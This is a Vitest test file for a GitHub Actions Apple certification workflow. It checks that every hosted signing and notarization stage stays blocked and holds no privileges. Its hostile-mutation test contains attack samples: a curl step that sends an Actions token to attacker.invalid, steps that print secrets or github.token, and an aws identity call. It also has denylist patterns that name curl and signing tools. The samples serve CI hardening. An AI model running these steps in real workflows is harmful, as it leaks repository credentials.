import { spawnSync } from "node:child_process";
import { readFile } from "node:fs/promises";
import { resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";
import { parse } from "yaml";

// @ts-expect-error Apple certification workflow helpers are intentionally private Node script modules.
import * as fakeExecutor from "../../scripts/apple-certification/fake-executor.mjs";
// @ts-expect-error Apple certification workflow helpers are intentionally private Node script modules.
import * as workflowModel from "../../scripts/apple-certification/workflow.mjs";

const { a7SyntheticEvidenceCases, runSyntheticCleanHostCase, runSyntheticJournalCase } = fakeExecutor;
const { deriveAppleWorkflowPlan, validateBlockedAppleWorkflow } = workflowModel;
const root = resolve(fileURLToPath(new URL("../..", import.meta.url)));
const workflowPath = resolve(root, ".github/workflows/apple-certification.yml");
const source = await readFile(workflowPath, "utf8");
const workflow = parse(source) as {
  readonly on: {
    readonly workflow_dispatch: {
      readonly inputs: Readonly<Record<string, { readonly required: boolean; readonly type: string }>>;
    };
  };
  readonly permissions: Readonly<Record<string, string>>;
  readonly concurrency: Readonly<Record<string, unknown>>;
  readonly jobs: Readonly<
    Record<string, {
      readonly environment?: string;
      readonly if?: string;
      readonly name?: string;
      readonly needs?: string | ReadonlyArray<string>;
      readonly permissions?: Readonly<Record<string, string>>;
      readonly "runs-on"?: string;
      readonly strategy?: {
        readonly "fail-fast"?: boolean;
        readonly matrix?: { readonly coordinate?: ReadonlyArray<string> };
      };
      readonly steps?: ReadonlyArray<{
        readonly name?: string;
        readonly run?: string;
        readonly shell?: string;
        readonly uses?: string;
      }>;
    }>
  >;
};
const contract = JSON.parse(await readFile(resolve(root, "tooling/effect-build-contract.json"), "utf8"));
const policy = contract.releaseCertification.apple;
const plan = deriveAppleWorkflowPlan(contract);
const stage = (id: string) => plan.stages.find((entry: { readonly id: string }) => entry.id === id);
const jobBody = (id: string) => workflow.jobs[id]?.steps?.map(({ run }) => run ?? "").join("\n") ?? "";
const clonedWorkflow = () => structuredClone(workflow) as any;

describe("Apple certification workflow external-interface hard stop", () => {
  it("derives the full logical DAG and exact protected-stage allowlist from the generated canon", () => {
    expect(plan.workflowPath).toBe(policy.workflowPath);
    expect(plan.workflow).toBe(policy.workflow);
    expect(plan.coordinates).toEqual(policy.coordinates);
    expect(plan.evidenceDescriptorOrder).toEqual(policy.evidenceDescriptorOrder);
    expect(plan.hostedExecution).toEqual(policy.hostedExecution);
    expect(plan.stages.map(({ id }: { readonly id: string }) => id)).toEqual([
      "admission",
      "native",
      "paired-app",
      "sign-app",
      "distribution-pairs",
      "submit-product",
      "continue-notary",
      "clean-host",
      "verdict",
      "final-verdict",
      "aggregate",
    ]);
    expect(plan.protectedStageIds).toEqual(policy.hostedExecution.protectedStageIds);
    expect(
      plan.stages.filter(({ protectedEnvironment }: { readonly protectedEnvironment: boolean }) => protectedEnvironment)
        .map(({ id }: { readonly id: string }) => id),
    ).toEqual(policy.hostedExecution.protectedStageIds);
    expect(stage("native")?.coordinates).toEqual(policy.coordinates.slice(0, 2));
    expect(stage("paired-app")?.coordinates).toEqual(["paired-app:bun", "paired-app:deno"]);
    expect(stage("sign-app")?.coordinates).toHaveLength(4);
    expect(stage("distribution-pairs")?.coordinates).toEqual(["paired-product:dmg", "paired-product:pkg"]);
    expect(stage("submit-product")?.coordinates).toEqual(stage("continue-notary")?.coordinates);
    expect(stage("submit-product")?.coordinates).toHaveLength(6);
    expect(stage("clean-host")?.coordinates).toHaveLength(6);
    expect(stage("verdict")?.coordinates).toEqual(policy.coordinates.slice(18, 27));
    expect(stage("final-verdict")?.coordinates).toEqual(["A9"]);
    expect(stage("final-verdict")?.needs).toEqual([
      "native",
      "sign-app",
      "continue-notary",
      "clean-host",
      "verdict",
    ]);
    expect(stage("aggregate")?.needs).toEqual(["final-verdict"]);
    expect(
      policy.coordinateRules.find(({ coordinate }: { readonly coordinate: string }) => coordinate === "A9")
        .dependencies.slice(-9),
    ).toEqual(stage("verdict")?.coordinates);
    expect(Object.keys(plan.handoffSchemas)).toEqual([
      "candidate-coordinate",
      "authenticated-prior-evidence-coordinate",
      "producer-bundle-identity",
      "verifier-bundle-identity",
      "evidence-entry",
      "executable-identity",
      "paired-app-manifest",
      "pair-identity",
      "journal-reference",
      "native-receipt",
      "signed-app-receipt",
      "notarized-product-receipt",
      "clean-host-receipt",
      "verdict-receipt",
      "aggregate-artifact-coordinate",
    ]);
    expect(stage("admission")).toMatchObject({
      consumes: ["candidate-coordinate"],
      produces: [
        "producer-bundle-identity",
        "verifier-bundle-identity",
        "authenticated-prior-evidence-coordinate",
        "evidence-entry",
      ],
    });
    expect(stage("submit-product")).toMatchObject({
      consumes: [
        "producer-bundle-identity",
        "authenticated-prior-evidence-coordinate",
        "signed-app-receipt",
        "pair-identity",
      ],
      produces: ["journal-reference", "authenticated-prior-evidence-coordinate", "evidence-entry"],
    });
    expect(stage("continue-notary")).toMatchObject({
      consumes: ["producer-bundle-identity", "authenticated-prior-evidence-coordinate", "journal-reference"],
      produces: [
        "notarized-product-receipt",
        "authenticated-prior-evidence-coordinate",
        "evidence-entry",
      ],
    });
    expect(stage("aggregate")?.produces).toEqual(["aggregate-artifact-coordinate"]);
    expect(plan.handoffSchemas["journal-reference"]).toEqual({
      authority: "releaseCertification.apple.receiptSchemas.journalReference",
      fields: policy.receiptSchemas.journalReference,
    });
    expect(plan.handoffSchemas["authenticated-prior-evidence-coordinate"]).toEqual({
      authority: "releaseCertification.githubArtifactCoordinate",
      fields: contract.releaseCertification.githubArtifactCoordinate.orderedFields,
      artifactAuthority: "releaseCertification.apple.protocols.priorEvidence",
      payloadProtocol: policy.protocols.priorEvidence,
      payloadEntryAuthority: "releaseCertification.apple.encoding.evidenceEntryFields",
      payloadEntryFields: policy.encoding.evidenceEntryFields,
      receiptBindingAuthority: "releaseCertification.apple.commonReceiptFields",
      receiptBindingFields: [
        "sourceSha",
        "candidateCoordinate",
        "workflowCoordinate",
        "producerDigest",
        "verifierDigest",
        "evidenceDigest",
      ],
      planAuthority: "plans/045-establish-v060-release-point.md#step-6.3",
      preservation: [
        "mode-preserving-file-envelope",
        "mode-and-relative-symlink-preserving-tree-envelope",
        "canonical-receipt-and-opaque-evidence-bytes",
      ],
      verification: [
        "authenticate-exact-artifact-coordinate-before-download",
        "authenticate-github-artifact-digest-before-envelope-open",
        "verify-evidence-entry-digest-and-receipt-identity-before-use",
      ],
    });
    expect(plan.handoffSchemas["aggregate-artifact-coordinate"]).toEqual({
      authority: "releaseCertification.githubArtifactCoordinate",
      fields: contract.releaseCertification.githubArtifactCoordinate.orderedFields,
      artifactAuthority: "releaseCertification.apple.artifact",
      artifactFields: Object.keys(policy.artifact),
      orderedFiles: policy.artifact.orderedFiles,
    });
    for (
      const stageId of [
        "native",
        "paired-app",
        "sign-app",
        "distribution-pairs",
        "submit-product",
        "continue-notary",
        "clean-host",
        "verdict",
        "final-verdict",
        "aggregate",
      ]
    ) {
      expect(stage(stageId)?.consumes).toContain("authenticated-prior-evidence-coordinate");
    }
    expect(plan.coordinates.some((coordinate: string) => /(?:public-zip|G-ZIP|node-sea)/iu.test(coordinate))).toBe(
      false,
    );
  });

  it("makes hosted success impossible before external interfaces are frozen", () => {
    const inputs = workflow.on.workflow_dispatch.inputs;
    expect(Object.keys(inputs).sort()).toEqual([
      "candidate_artifact_digest",
      "candidate_artifact_id",
      "candidate_run_attempt",
      "candidate_run_id",
      "source_sha",
    ]);
    expect(Object.values(inputs).every(({ required, type }) => required && type === "string")).toBe(true);
    expect(workflow.permissions).toEqual({ contents: "read" });
    expect(workflow.concurrency).toEqual({
      group: "effect-build-apple-certification-v0.6.0",
      "cancel-in-progress": false,
    });
    expect(Object.keys(workflow.jobs)).toEqual([
      "local-protocol-qualification",
      "admission",
      "native",
      "paired-app",
      "sign-app",
      "distribution-pairs",
      "submit-product",
      "continue-notary",
      "clean-host",
      "verdict",
      "final-verdict",
      "aggregate",
    ]);
    expect(workflow.jobs.admission?.needs).toBe("local-protocol-qualification");
    expect(jobBody("local-protocol-qualification")).toContain(
      "test/architecture/apple-certification-workflow.test.ts",
    );
    expect(jobBody("local-protocol-qualification").indexOf("bun run build")).toBeLessThan(
      jobBody("local-protocol-qualification").indexOf("bun run --cwd packages/effect-build-apple test"),
    );
    expect(jobBody("local-protocol-qualification")).toContain("packages/effect-build-apple test");
    expect(jobBody("local-protocol-qualification")).toContain("scripts/release/assert-current-main.mjs");
    expect(jobBody("admission")).toContain("workflow.mjs --assert-hosted-ready");
    expect(validateBlockedAppleWorkflow(workflow, contract)).toEqual(plan);
    expect(Object.values(workflow.jobs).some(({ environment }) => environment !== undefined)).toBe(false);
    expect(source).not.toContain("id-token: write");
    expect(source).not.toContain("${{ secrets.");
    expect(source).not.toContain("${{ vars.");
    expect(source).not.toContain("actions/upload-artifact@");
    expect(source).not.toContain("actions/download-artifact@");
    expect(source).not.toContain(policy.artifact.name);
    expect(source).not.toContain("git ls-remote");
    expect(source).not.toMatch(/\bcurl\b/u);

    const stopped = spawnSync(process.execPath, [
      resolve(root, "scripts/apple-certification/workflow.mjs"),
      "--assert-hosted-ready",
    ], { encoding: "utf8" });
    expect(stopped.status).toBe(78);
    expect(stopped.stdout).toBe("");
    expect(stopped.stderr).toContain("external-interface-stop:");
    expect(plan.hostedExecution.status).toBe("blocked");
    expect(plan.hostedExecution.artifactDisposition).toBe("forbidden-while-blocked");
    for (const blocker of plan.hostedExecution.blockerIds) expect(stopped.stderr).toContain(blocker);
  });

  it("materializes every future stage and coordinate as a static, zero-authority STOP stub", () => {
    for (const stagePlan of plan.stages.slice(1)) {
      const job = workflow.jobs[stagePlan.id]!;
      expect(job.if).toBe("${{ false }}");
      expect(job["runs-on"]).toBe("ubuntu-24.04");
      expect(job.permissions).toEqual({});
      expect(job.environment).toBeUndefined();
      expect(Array.isArray(job.needs) ? job.needs : [job.needs]).toEqual(stagePlan.needs);
      expect(job.steps).toEqual([{
        name: "Unreachable while Apple hosted execution is blocked",
        shell: "bash",
        run: "set -euo pipefail\nexit 78\n",
      }]);
      if (stagePlan.coordinates.length === 0) {
        expect(job.strategy).toBeUndefined();
      } else {
        expect(job.strategy).toEqual({
          "fail-fast": false,
          matrix: { coordinate: stagePlan.coordinates },
        });
      }
    }

    expect(
      plan.hostedExecution.activationInterfaces.runners.receiptPins.every(({ runnerLabel }: any) =>
        runnerLabel === null
      ),
    ).toBe(true);
    const orderedReceipts = ["native", "sign-app", "continue-notary", "clean-host", "verdict", "final-verdict"]
      .flatMap((id) => workflow.jobs[id]!.strategy!.matrix!.coordinate!);
    expect(orderedReceipts).toEqual(policy.coordinates);
    expect(new Set(orderedReceipts).size).toBe(28);
    expect({
      N: orderedReceipts.filter((coordinate) => coordinate.startsWith("N-")).length,
      P: orderedReceipts.filter((coordinate) => coordinate.startsWith("P-")).length,
      G: orderedReceipts.filter((coordinate) => coordinate.startsWith("G-")).length,
      A: orderedReceipts.filter((coordinate) => coordinate.startsWith("A")).length,
    }).toEqual({ N: 2, P: 10, G: 6, A: 10 });
    expect(source).not.toMatch(
      /\b(?:aws|codesign|hdiutil|installer|notarytool|pkgbuild|productbuild|security|spctl|xcrun)\b/iu,
    );
  });

  it("rejects hostile topology, authority, execution, and artifact mutations", () => {
    const mutations: ReadonlyArray<(value: any) => void> = [
      (value) => {
        delete value.jobs.native;
      },
      (value) => {
        value.jobs.native.if = "${{ true }}";
      },
      (value) => {
        value.jobs["paired-app"].needs = "admission";
      },
      (value) => {
        value.jobs.verdict.strategy.matrix.coordinate.push("A10");
      },
      (value) => {
        value.jobs["final-verdict"].needs = ["native", "sign-app", "continue-notary", "clean-host"];
      },
      (value) => {
        value.jobs["sign-app"].environment = "apple-certification";
      },
      (value) => {
        value.jobs["submit-product"].permissions["id-token"] = "write";
      },
      (value) => {
        value.jobs.native.steps[0].run = "codesign --sign invented product\n";
      },
      (value) => {
        value.jobs["local-protocol-qualification"].steps.push({
          run: "printf '%s' '${{ secrets.INVENTED }}'",
        });
      },
      (value) => {
        value.jobs["local-protocol-qualification"].steps.push({
          uses: "actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02",
        });
      },
      (value) => {
        value.jobs["local-protocol-qualification"].steps[5].run += "\nxcrun notarytool history";
      },
      (value) => {
        value.jobs["local-protocol-qualification"].steps[5].run += "\nprintf '%s\\n' '${{ github.token }}'";
      },
      (value) => {
        value.jobs["local-protocol-qualification"].steps[2].run +=
          '\ncurl -H "Authorization: Bearer $ACTIONS_READ_TOKEN" https://attacker.invalid';
      },
      (value) => {
        value.on.workflow_dispatch.inputs.source_sha.default = "main";
      },
      (value) => {
        value.jobs["local-protocol-qualification"].permissions = { packages: "write" };
      },
      (value) => {
        value.jobs["local-protocol-qualification"].steps[0].with["persist-credentials"] = true;
      },
      (value) => {
        value.jobs.native.steps[0]["continue-on-error"] = true;
      },
      (value) => {
        value.jobs.admission.steps[2].run += "\naws sts get-caller-identity";
      },
      (value) => {
        value.jobs.aggregate.name = policy.artifact.name;
      },
      (value) => {
        value.jobs.native.name += ` ${policy.hostedExecution.activationInterfaces.aws.prefix}`;
      },
    ];

    for (const mutate of mutations) {
      const hostile = clonedWorkflow();
      mutate(hostile);
      expect(() => validateBlockedAppleWorkflow(hostile, contract)).toThrow();
    }

    const unadmittedContext = clonedWorkflow();
    unadmittedContext.on.workflow_dispatch.inputs.source_sha.description = "${{ github.actor }}";
    expect(() => validateBlockedAppleWorkflow(unadmittedContext, contract)).toThrow(
      /unadmitted GitHub expression context/u,
    );

    const movedGitHubToken = clonedWorkflow();
    movedGitHubToken.on.workflow_dispatch.inputs.source_sha.description = "${{ github.token }}";
    expect(() => validateBlockedAppleWorkflow(movedGitHubToken, contract)).toThrow(/github\.token/u);
  });

  it("keeps every blocked activation interface explicit and unusable as production identity", () => {
    const interfaces = plan.hostedExecution.activationInterfaces;
    expect(interfaces.status).toBe("unconfigured");
    expect(interfaces.producer).toMatchObject({ status: "unconfigured", sourceSha: null, bundleDigest: null });
    expect(interfaces.verifier).toMatchObject({ status: "unconfigured", sourceSha: null, bundleDigest: null });
    expect(interfaces.certificates).toEqual({
      status: "unconfigured",
      teamId: null,
      applicationSha1: null,
      installerSha1: null,
    });
    expect(interfaces.environment).toEqual({
      status: "provisioned-policy-only",
      authorityScope: "environment-policy-only-not-credential-or-runner-qualification",
      repository: "mannyc2/effect-build",
      repositoryId: "1331906770",
      repositoryOwnerId: "126291407",
      environmentId: "20977544910",
      name: "apple-certification",
      canAdminsBypass: true,
      reviewer: {
        id: 126291407,
        login: "mannyc2",
        type: "User",
        preventSelfReview: false,
      },
      branchPolicy: {
        name: "main",
        type: "branch",
        deploymentBranchPolicy: {
          customBranchPolicies: true,
          protectedBranches: false,
        },
        exactProtectionRuleTypes: ["branch_policy", "required_reviewers"],
        branchPolicies: [{ name: "main", type: "branch" }],
      },
      secretNames: [],
      variableNames: [],
      oidcSubjectPolicy: {
        use_default: true,
        use_immutable_subject: false,
        sub_claim_prefix: "repo:mannyc2@126291407/effect-build@1331906770",
      },
    });
    expect(interfaces.credentialLayer).toMatchObject({ status: "unconfigured", type: null, secretNames: [] });
    expect(interfaces.journal).toMatchObject({
      status: "unconfigured",
      packageVersion: null,
      sourceSha: null,
      reusableWorkflowRef: null,
      reusableWorkflowSha: null,
      codecId: null,
    });
    expect(interfaces.aws).toMatchObject({
      status: "unconfigured",
      accountId: null,
      bucketArn: null,
      region: null,
      roleArn: null,
      retentionPolicyDigest: null,
      iamPolicyDigest: null,
      bucketPolicyDigest: null,
      oidcTrustPolicyDigest: null,
      oidcJobWorkflowRef: null,
      oidcJobWorkflowSha: null,
    });
    expect(interfaces.runners.status).toBe("unqualified");
    expect(interfaces.runners.receiptPins).toHaveLength(9);
    expect(
      interfaces.runners.receiptPins.every((pin: any) =>
        pin.status === "unqualified"
        && pin.runnerLabel === null
        && pin.platform === null
        && pin.architecture === null
        && pin.image === null
        && pin.runnerEnvironment === null
      ),
    ).toBe(true);
    expect(interfaces.continuation).toEqual({
      status: "unconfigured",
      initialDelaySeconds: null,
      pollIntervalSeconds: null,
      maximumPolls: null,
      maximumElapsedSeconds: null,
    });

    const placeholderProducer = structuredClone(contract);
    placeholderProducer.releaseCertification.apple.hostedExecution.activationInterfaces.producer.bundleDigest =
      `sha256:${"0".repeat(64)}`;
    expect(() => deriveAppleWorkflowPlan(placeholderProducer)).toThrow(/explicit null/u);

    const inventedRunner = structuredClone(contract);
    inventedRunner.releaseCertification.apple.hostedExecution.activationInterfaces.runners.receiptPins[0].image =
      "macos-15";
    expect(() => deriveAppleWorkflowPlan(inventedRunner)).toThrow(/explicit null/u);
  });

  it("maps every A7 subordinate evidence ID to exact synthetic-only journal cases", () => {
    const subordinateEvidence =
      policy.coordinateRules.find(({ coordinate }: { readonly coordinate: string }) => coordinate === "A7").fieldValues
        .subordinateEvidence;
    expect(Object.keys(a7SyntheticEvidenceCases)).toEqual(subordinateEvidence);

    for (const evidenceId of subordinateEvidence) {
      const scenario = a7SyntheticEvidenceCases[evidenceId];
      const architectures = evidenceId.endsWith("both-architectures") ? ["arm64", "x64"] : ["arm64"];
      for (const architecture of architectures) {
        const result = runSyntheticJournalCase(scenario, { architecture });
        expect(result).toMatchObject({
          architecture,
          providerCalls: evidenceId === "interruption" ? 0 : 1,
          retryCalls: 0,
        });
        expect(result.protocol).toBe("effect-build/apple-synthetic-executor@1");
        expect(result.terminal).not.toBe("success");
        expect(result).not.toHaveProperty("verdict");
        expect(result).not.toHaveProperty("evidenceDigest");
      }
    }

    expect(runSyntheticJournalCase(a7SyntheticEvidenceCases["accepted-both-architectures"]).terminal).toBe(
      "synthetic-only-accepted",
    );
    expect(runSyntheticJournalCase(a7SyntheticEvidenceCases["pending-both-architectures"]).terminal).toBe(
      "synthetic-only-pending",
    );
    expect(runSyntheticJournalCase(a7SyntheticEvidenceCases["rejected-both-architectures"]).terminal).toBe(
      "synthetic-only-rejected",
    );
    expect(runSyntheticJournalCase(a7SyntheticEvidenceCases["info-and-log"]).observationCalls).toBe(2);
  });

  it("fake-journal cases prove canonical restart, every crash boundary, and exact no-retry control flow", () => {
    const complete = runSyntheticJournalCase("complete");
    const resumed = runSyntheticJournalCase("fresh-runner-resume");
    const intentAcknowledgementLoss = runSyntheticJournalCase("intent-acknowledgement-loss");
    const intentRereadMismatch = runSyntheticJournalCase("intent-reread-mismatch");
    const crash = runSyntheticJournalCase("crash-before-provider");
    const serviceFailure = runSyntheticJournalCase("service-failure");
    const responseLoss = runSyntheticJournalCase("provider-response-loss");
    const postProviderCrash = runSyntheticJournalCase("post-provider-pre-journal-crash");
    const acknowledgementLoss = runSyntheticJournalCase("submission-acknowledgement-loss");
    const rereadMismatch = runSyntheticJournalCase("submission-reread-mismatch");
    const interruption = runSyntheticJournalCase("interruption");

    expect(complete).toMatchObject({
      terminal: "synthetic-only-complete",
      providerCalls: 1,
      retryCalls: 0,
      journalAppends: 2,
      journalReads: 2,
    });
    expect(resumed.restartProof).toMatchObject({
      acknowledgementReinstantiated: true,
      journalReinstantiated: true,
      persistedBytesDigest: expect.stringMatching(/^sha256:[0-9a-f]{64}$/u),
      recordObjectsReinstantiated: true,
    });
    expect(resumed.trace).toContain("fresh-runner-restored-canonical-persisted-bytes-without-shared-objects");
    expect(intentAcknowledgementLoss).toMatchObject({
      terminal: "journal-acknowledgement-stop",
      providerCalls: 0,
      retryCalls: 0,
      journalAppends: 1,
      journalReads: 0,
    });
    expect(intentRereadMismatch).toMatchObject({
      terminal: "journal-reread-stop",
      providerCalls: 0,
      retryCalls: 0,
      journalAppends: 1,
      journalReads: 1,
    });
    expect(crash).toMatchObject({ terminal: "injected-stop", providerCalls: 0, retryCalls: 0 });
    expect(interruption).toMatchObject({ terminal: "injected-stop", providerCalls: 0, retryCalls: 0 });
    expect(serviceFailure).toMatchObject({
      terminal: "unknown-outcome-stop",
      providerCalls: 1,
      retryCalls: 0,
      journalAppends: 1,
      journalReads: 1,
    });
    expect(responseLoss).toMatchObject({ terminal: "unknown-outcome-stop", providerCalls: 1, retryCalls: 0 });
    expect(postProviderCrash).toMatchObject({
      terminal: "unknown-outcome-stop",
      providerCalls: 1,
      retryCalls: 0,
      journalAppends: 1,
      journalReads: 1,
    });
    expect(acknowledgementLoss).toMatchObject({
      terminal: "unknown-outcome-stop",
      providerCalls: 1,
      retryCalls: 0,
      journalAppends: 2,
      journalReads: 1,
    });
    expect(rereadMismatch).toMatchObject({ terminal: "unknown-outcome-stop", providerCalls: 1, retryCalls: 0 });
    for (
      const result of [
        complete,
        resumed,
        intentAcknowledgementLoss,
        intentRereadMismatch,
        crash,
        serviceFailure,
        responseLoss,
        postProviderCrash,
        acknowledgementLoss,
        rereadMismatch,
        interruption,
      ]
    ) {
      expect(result.terminal).not.toBe("success");
      expect(result.retryCalls).toBe(0);
    }
  });

  it("fake clean hosts enforce exact preflight, quarantine, normal flow, and cleanup labels without receipts", () => {
    const rules = policy.coordinateRules.filter(({ category }: { readonly category: string }) =>
      category === "G-clean-host"
    );
    expect(rules).toHaveLength(6);
    for (const rule of rules) {
      const complete = runSyntheticCleanHostCase(rule, "complete");
      expect(complete).toMatchObject({ coordinate: rule.coordinate, terminal: "synthetic-only-complete" });
      expect(complete).not.toHaveProperty("verdict");
      expect(complete).not.toHaveProperty("evidenceDigest");
      expect(runSyntheticCleanHostCase(rule, "preexisting-state").terminal).toBe("blocked-before-acquisition");
      expect(runSyntheticCleanHostCase(rule, "quarantine-bypass").terminal).toBe(
        "blocked-forbidden-quarantine-action",
      );
      expect(runSyntheticCleanHostCase(rule, "cleanup-failure").terminal).toBe("blocked-incomplete-cleanup");
    }
  });
});
